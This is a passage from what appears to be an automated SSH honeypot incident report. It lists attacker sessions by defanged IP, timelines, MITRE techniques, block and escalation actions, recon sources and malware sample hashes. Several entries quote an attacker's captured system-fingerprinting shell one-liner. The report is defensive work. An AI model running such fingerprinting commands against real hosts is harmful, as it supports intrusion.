| `2026-07-26 08:42:37` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af586374f4c

| Field | Detail |
|---|---|
| **Source IP** | `117.177.235[.]249` |
| **First Seen** | 2026-07-26 08:42 |
| **Last Seen** | 2026-07-26 08:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:42:42` | `cowrie.session.connect` |
| `2026-07-26 08:42:43` | `cowrie.client.version` |
| `2026-07-26 08:42:43` | `cowrie.client.kex` |
| `2026-07-26 08:42:46` | `cowrie.login.success` |
| `2026-07-26 08:42:47` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.177.235[.]249` to AbuseIPDB if not already reported
- [ ] Block `117.177.235[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10e462c0a361

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:42 |
| **Last Seen** | 2026-07-26 08:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:42:50` | `cowrie.session.connect` |
| `2026-07-26 08:42:50` | `cowrie.client.version` |
| `2026-07-26 08:42:51` | `cowrie.client.kex` |
| `2026-07-26 08:42:52` | `cowrie.login.success` |
| `2026-07-26 08:42:53` | `cowrie.session.params` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.success` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:53` | `cowrie.command.input` |
| `2026-07-26 08:42:54` | `cowrie.log.closed` |
| `2026-07-26 08:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d5b3da79f0

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]84` |
| **First Seen** | 2026-07-26 08:43 |
| **Last Seen** | 2026-07-26 08:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:43:42` | `cowrie.session.connect` |
| `2026-07-26 08:43:42` | `cowrie.client.version` |
| `2026-07-26 08:43:42` | `cowrie.client.kex` |
| `2026-07-26 08:43:44` | `cowrie.login.success` |
| `2026-07-26 08:43:45` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]84` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee18800cee6

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]26` |
| **First Seen** | 2026-07-26 08:43 |
| **Last Seen** | 2026-07-26 08:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:43:50` | `cowrie.session.connect` |
| `2026-07-26 08:43:51` | `cowrie.client.version` |
| `2026-07-26 08:43:51` | `cowrie.client.kex` |
| `2026-07-26 08:43:53` | `cowrie.login.success` |
| `2026-07-26 08:43:53` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]26` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67d38b346e7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:44 |
| **Last Seen** | 2026-07-26 08:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:44:31` | `cowrie.session.connect` |
| `2026-07-26 08:44:32` | `cowrie.client.version` |
| `2026-07-26 08:44:32` | `cowrie.client.kex` |
| `2026-07-26 08:44:33` | `cowrie.login.success` |
| `2026-07-26 08:44:35` | `cowrie.session.params` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.success` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.command.input` |
| `2026-07-26 08:44:35` | `cowrie.log.closed` |
| `2026-07-26 08:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac86317a055

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:46 |
| **Last Seen** | 2026-07-26 08:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:46:12` | `cowrie.session.connect` |
| `2026-07-26 08:46:12` | `cowrie.client.version` |
| `2026-07-26 08:46:12` | `cowrie.client.kex` |
| `2026-07-26 08:46:14` | `cowrie.login.success` |
| `2026-07-26 08:46:15` | `cowrie.session.params` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.success` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:15` | `cowrie.command.input` |
| `2026-07-26 08:46:16` | `cowrie.log.closed` |
| `2026-07-26 08:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247b1a41cc6c

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-26 08:46 |
| **Last Seen** | 2026-07-26 08:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:46:57` | `cowrie.session.connect` |
| `2026-07-26 08:46:58` | `cowrie.client.version` |
| `2026-07-26 08:46:58` | `cowrie.client.kex` |
| `2026-07-26 08:47:00` | `cowrie.login.success` |
| `2026-07-26 08:47:01` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-736e28543395

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-07-26 08:47 |
| **Last Seen** | 2026-07-26 08:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:47:08` | `cowrie.session.connect` |
| `2026-07-26 08:47:09` | `cowrie.client.version` |
| `2026-07-26 08:47:09` | `cowrie.client.kex` |
| `2026-07-26 08:47:11` | `cowrie.login.success` |
| `2026-07-26 08:47:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d8d500dd33

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:47 |
| **Last Seen** | 2026-07-26 08:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:47:50` | `cowrie.session.connect` |
| `2026-07-26 08:47:50` | `cowrie.client.version` |
| `2026-07-26 08:47:50` | `cowrie.client.kex` |
| `2026-07-26 08:47:52` | `cowrie.login.success` |
| `2026-07-26 08:47:53` | `cowrie.session.params` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.success` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:53` | `cowrie.command.input` |
| `2026-07-26 08:47:54` | `cowrie.log.closed` |
| `2026-07-26 08:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef5bf88a992

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:49 |
| **Last Seen** | 2026-07-26 08:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:49:33` | `cowrie.session.connect` |
| `2026-07-26 08:49:33` | `cowrie.client.version` |
| `2026-07-26 08:49:33` | `cowrie.client.kex` |
| `2026-07-26 08:49:35` | `cowrie.login.success` |
| `2026-07-26 08:49:36` | `cowrie.session.params` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.success` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.command.input` |
| `2026-07-26 08:49:36` | `cowrie.log.closed` |
| `2026-07-26 08:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **18** | 2026-07-26 04:58 | 2026-07-26 08:54 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `34.79.245[.]31` | **10** | 2026-07-26 06:02 | 2026-07-26 06:03 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-26 05:14 | 2026-07-26 08:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **9** | 2026-07-26 05:03 | 2026-07-26 07:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **6** | 2026-07-26 06:33 | 2026-07-26 07:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]183` | **5** | 2026-07-26 05:48 | 2026-07-26 07:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]220` | **4** | 2026-07-26 07:50 | 2026-07-26 07:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-07-26 08:53 | 2026-07-26 08:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]184` | **3** | 2026-07-26 07:50 | 2026-07-26 07:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]197` | **3** | 2026-07-26 07:46 | 2026-07-26 07:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]57` | **3** | 2026-07-26 07:49 | 2026-07-26 07:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]73` | **3** | 2026-07-26 07:52 | 2026-07-26 07:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | **3** | 2026-07-26 07:48 | 2026-07-26 07:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **3** | 2026-07-26 06:30 | 2026-07-26 07:30 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `13.89.124[.]214` | **2** | 2026-07-26 06:23 | 2026-07-26 06:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-26 05:11 | 2026-07-26 05:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.171.8[.]86` | **2** | 2026-07-26 05:32 | 2026-07-26 05:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.144[.]62` | **2** | 2026-07-26 07:56 | 2026-07-26 07:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `218.61.251[.]3` | **2** | 2026-07-26 05:32 | 2026-07-26 05:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `42.51.45[.]100` | **2** | 2026-07-26 08:46 | 2026-07-26 08:48 | 2m | 0 | `T1592` | 🟢 LOW |
| `47.92.138[.]212` | **2** | 2026-07-26 08:16 | 2026-07-26 08:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-07-26 07:52 | 2026-07-26 08:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]254` | **2** | 2026-07-26 06:08 | 2026-07-26 06:08 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `120.236.49[.]131` | 1 | 2026-07-26 07:23 | 2026-07-26 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]119` | 1 | 2026-07-26 07:19 | 2026-07-26 07:19 | 43s | 0 | `T1592` | 🟢 LOW |
| `154.221.24[.]172` | 1 | 2026-07-26 05:50 | 2026-07-26 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `160.119.71[.]92` | 1 | 2026-07-26 04:55 | 2026-07-26 04:55 | 12s | 0 | `T1592` | 🟢 LOW |
| `172.245.106[.]112` | 1 | 2026-07-26 05:47 | 2026-07-26 05:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `183.171.237[.]250` | 1 | 2026-07-26 07:00 | 2026-07-26 07:00 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-07-26 05:56 | 2026-07-26 05:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]154` | 1 | 2026-07-26 05:34 | 2026-07-26 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]253` | 1 | 2026-07-26 05:33 | 2026-07-26 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-07-26 06:39 | 2026-07-26 06:39 | 5s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-07-26 06:15 | 2026-07-26 06:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.22.226[.]141` | 1 | 2026-07-26 06:02 | 2026-07-26 06:02 | 3s | 0 | `T1592` | 🟢 LOW |
| `36.64.211[.]93` | 1 | 2026-07-26 05:02 | 2026-07-26 05:02 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-07-26 07:05 | 2026-07-26 07:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]5` | 1 | 2026-07-26 05:44 | 2026-07-26 05:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-26 08:36 | 2026-07-26 08:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-26 07:37 | 2026-07-26 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.2.228[.]177` | 1 | 2026-07-26 08:38 | 2026-07-26 08:38 | 16s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-07-26 06:34 | 2026-07-26 06:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]42` | 1 | 2026-07-26 06:49 | 2026-07-26 06:49 | 15s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-07-26 08:38 | 2026-07-26 08:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-07-26 07:50 | 2026-07-26 07:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]13` | 1 | 2026-07-26 06:49 | 2026-07-26 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]220` | 1 | 2026-07-26 05:14 | 2026-07-26 05:14 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
